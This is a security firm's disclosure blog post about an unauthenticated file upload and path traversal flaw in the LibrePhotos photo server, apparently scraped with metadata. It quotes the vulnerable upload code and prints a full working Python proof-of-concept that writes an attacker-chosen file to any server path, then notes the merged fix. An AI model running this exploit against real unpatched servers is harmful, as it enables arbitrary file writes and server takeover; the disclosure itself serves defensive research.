---
schema_version: "1.0.0"
document_id: "73d3643a78b00fe258400fdfa49d6044dc53ed369b92a0d0280707a24a737d34"
company_key: "yc-zeropath"
company: "ZeroPath"
source_id: "yc-zeropath-news-import-51f20a74ff70"
canonical_url: "https://zeropath.com/blog/librephotos-arbitrary-file-upload-vulnerability"
published_at: "2024-08-24T00:00:00+00:00"
first_seen_at: "2026-07-24T06:51:45.842756+00:00"
fetched_at: "2026-07-28T22:01:06.812214+00:00"
content_hash: "sha256:ba8e3a414cd523fcef8cd91f78cafe88b95944077408360234cf046f745fd473"
---

# LibrePhotos Arbitrary File Upload + Path Traversal PoC

# LibrePhotos Arbitrary File Upload + Path Traversal PoC


*By Nathan Hrncirik, Co-Founder and Security Researcher at ZeroPath*


ZeroPath security researchers discovered a critical vulnerability in[LibrePhotos](https://github.com/LibrePhotos/librephotos) , a popular open-source self-hosted photo management platform. The vulnerability allows for unauthenticated arbitrary file upload, which, when combined with a path traversal vulnerability, enables attackers to write files anywhere on the system.


*Proof of concept demo*


## Vulnerability Discovery + Details


The bug stems from a lack of authentication and input sanitization in LibrePhotos' file upload functionality. Specifically, the issue lies in the` on_completion` function in the` api/views/upload.py` file:


```text
def     on_completion  (  self  ,   uploaded_file  ,   request  )  :
user   =   User  .  objects  .  filter  (  id  =  request  .  POST  .  get  (  "user"  )  )  .  first  (  )
filename   =   request  .  POST  .  get  (  "filename"  )
device   =     "web"


if     not   os  .  path  .  exists  (  os  .  path  .  join  (  user  .  scan_directory  ,     "uploads"  )  )  :
os  .  mkdir  (  os  .  path  .  join  (  user  .  scan_directory  ,     "uploads"  )  )
if     not   os  .  path  .  exists  (  os  .  path  .  join  (  user  .  scan_directory  ,     "uploads"  ,   device  )  )  :
os  .  mkdir  (  os  .  path  .  join  (  user  .  scan_directory  ,     "uploads"  ,   device  )  )


# ... (omitted for brevity)


photo_path   =   os  .  path  .  join  (  user  .  scan_directory  ,     "uploads"  ,   device  ,   filename  )


if   photo_path  :
with     open  (  photo_path  ,     "wb"  )     as   f  :
photo  .  seek  (  0  )
f  .  write  (  photo  .  read  (  )  )
```


The direct use of the user-supplied` filename` in the` os.path.join()` function without proper sanitization allows an attacker to manipulate the` photo_path` variable, setting it to an arbitrary location outside the intended` scan_directory` . By including path traversal sequences` ../` in the filename, an attacker can write files to any accessible location on the servers filesystem.


To demonstrate the vulnerability, we've created a proof-of-concept script that exploits the arbitrary file upload and path traversal vulnerabilities:


```text
#!/usr/bin/env python3


import   argparse
import   requests
import   hashlib
import   os


def     calculate_md5  (  file_path  )  :
hash_md5   =   hashlib  .  md5  (  )
with     open  (  file_path  ,     "rb"  )     as   f  :
for   chunk   in     iter  (  lambda  :   f  .  read  (  4096  )  ,     b""  )  :
hash_md5  .  update  (  chunk  )
return   hash_md5  .  hexdigest  (  )


def     chunked_upload  (  file_path  ,   upload_url  ,   complete_url  ,   user_id  ,   target_filename  )  :
md5_hash   =   calculate_md5  (  file_path  )
print  (  f"[*] MD5 hash of file:   {  md5_hash  }  "  )


with     open  (  file_path  ,     'rb'  )     as     file  :
files   =     {  'file'  :     (  target_filename  ,     file  )  }
data   =     {
'filename'  :   target_filename  ,
'user'  :   user_id  ,
'scan_directory'  :     "tmp"  ,
'md5'  :   md5_hash
}


response   =   requests  .  post  (  upload_url  ,   files  =  files  ,   data  =  data  )


if   response  .  status_code   !=     200  :
print  (  f"[-] Upload initiation failed:   {  response  .  text  }  "  )
return


upload_id   =   response  .  json  (  )  .  get  (  'upload_id'  )


if     not   upload_id  :
print  (  "[-] Failed to get upload_id from response"  )
return


print  (  f"[+] Upload initiated with upload_id:   {  upload_id  }  "  )


data   =     {
'upload_id'  :   upload_id  ,
'filename'  :   target_filename  ,
'user'  :   user_id  ,
'md5'  :   md5_hash
}


response   =   requests  .  post  (  complete_url  ,   data  =  data  )


if   response  .  status_code   ==     500  :
print  (  "[+] Upload completed successfully"  )
else  :
print  (  f"[-] Upload completion failed:   {  response  .  text  }  "  )


def     main  (  )  :
parser   =   argparse  .  ArgumentParser  (  description  =  'File Upload Vulnerability PoC'  )
parser  .  add_argument  (  '--url'  ,   required  =  True  ,     help  =  'Base URL of the target application'  )
parser  .  add_argument  (  '--file'  ,   required  =  True  ,     help  =  'Path to the file to upload'  )
parser  .  add_argument  (  '--target'  ,   required  =  True  ,     help  =  'Target filename (including path) on the server'  )
parser  .  add_argument  (  '--user'  ,   default  =  '1'  ,     help  =  'User ID (default: 1)'  )


args   =   parser  .  parse_args  (  )


upload_url   =     f"  {  args  .  url  }  /api/upload/"
complete_url   =     f"  {  args  .  url  }  /api/upload/complete/"


print  (  "[!] LibrePhotos Arbitrary File Upload Vulnerability PoC"  )
print  (  f"[*] Target URL:   {  args  .  url  }  "  )
print  (  f"[*] File to upload:   {  args  .  file  }  "  )
print  (  f"[*] Target filename:   {  args  .  target  }  "  )
print  (  f"[*] User ID:   {  args  .  user  }  "  )


chunked_upload  (  args  .  file  ,   upload_url  ,   complete_url  ,   args  .  user  ,   args  .  target  )


if   __name__   ==     "__main__"  :
main  (  )
```


## Conclusion


We submitted a[pull request](https://github.com/LibrePhotos/librephotos/pull/1379) to fix the path traversal vulnerability. The PR was promptly merged, so we recommend upgrading to the latest version of LibrePhotos on GitHub.


## Want to chat?


This path traversal vulnerability gives a partial demonstration of ZeroPath's scanning capabilities. While many vulnerability scanners might have flagged this issue, ZeroPath's ability to automatically investigate results across large numbers of repositories was a big help with initial identification.


If you're interested in how you can use ZeroPath to improve your code security, please set up a[call](https://cal.com/team/zeropath/chat) with our team!


## Legal Disclaimer


The Proof of Concept (PoC) provided serves solely for educational and research objectives. Its purpose is to showcase a specific vulnerability and aid in comprehending associated security risks.


The creators and contributors of this blog disclaim all liability for the improper use or any damage or harm resulting from the use of this PoC. By utilizing this PoC, you consent to use it in a responsible manner and at your own risk.
